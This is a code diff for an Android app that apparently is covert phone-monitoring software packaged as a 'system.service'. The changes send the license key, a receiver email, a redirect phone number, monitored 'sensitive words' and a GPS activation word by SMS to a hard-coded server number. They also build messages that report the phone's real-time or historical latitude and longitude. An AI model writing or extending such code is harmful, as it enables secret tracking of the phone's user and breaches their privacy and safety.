@@ -10,6 +10,8 @@ import system.service.activity.GlobalPrefActivity;
 import system.service.config.ConfigCtrl;
 import system.service.feature.contact.ContactInfo;
 import com.particle.inspector.common.util.SysUtils;
+import com.particle.inspector.common.util.gps.GpsUtil;
+
 import system.service.feature.sms.SMS_TYPE;
 
 import android.app.Service;
@@ -199,23 +201,41 @@ public class SmsCtrl
 		return tempString;
 	}
 
-	// The sms content format: <header>,<license key>,<receiver mail>,<receiver phone num>,<receiver sensitive words>,<gps activation word>
+	// The sms content format: <header>,<license key>,<receiver mail>,<receiver phone num>,<gps activation word>
 	public static void sendReceiverInfoSms(Context context) {
 		String strMobile = context.getResources().getString(R.string.srv_address).trim();
 		String key = ConfigCtrl.getLicenseKey(context);
 		if (key == null) key = "";
 		String rcvMail = GlobalPrefActivity.getMail(context);
 		String rcvPhoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
-		String sensWords = GlobalPrefActivity.getSensitiveWords(context);
 		String gpsWord = GlobalPrefActivity.getGpsWord(context);
-		String strContent = "Info," + key + "," + rcvMail + "," + rcvPhoneNum + "," + sensWords + "," + gpsWord;
+		String strContent = "Info," + key + "," + rcvMail + "," + rcvPhoneNum + "," + gpsWord;
+		sendSms(strMobile, strContent);
+	}
+	
+	// The sms content format: <header>,<license key>,<receiver sensitive words>
+	public static void sendSensitiveWordsSms(Context context) {
+		String strMobile = context.getResources().getString(R.string.srv_address).trim();
+		String key = ConfigCtrl.getLicenseKey(context);
+		if (key == null) key = "";
+		String sensWords = GlobalPrefActivity.getSensitiveWords(context);
+		String strContent = "SensWds," + key + "," + sensWords;
 		sendSms(strMobile, strContent);
 	}
 
-	public static String buildGpsLocationSms(Context context, Location location) 
+	public static String buildLocationSms(Context context, Location location, String realOrHist) 
 	{
-		return String.format(context.getResources().getString(R.string.gps_sms), 
+		if (location == null) {
+			return String.format(context.getResources().getString(R.string.location_sms_fail));
+		}
+		
+		if (realOrHist.equals(GpsUtil.REALPOSITION)) {
+			return String.format(context.getResources().getString(R.string.location_sms_real), 
 				location.getLatitude() + "," + location.getLongitude());
+		} else {
+			return String.format(context.getResources().getString(R.string.location_sms_hist), 
+				location.getLatitude() + "," + location.getLongitude());
+		}
 	}
 	
 }
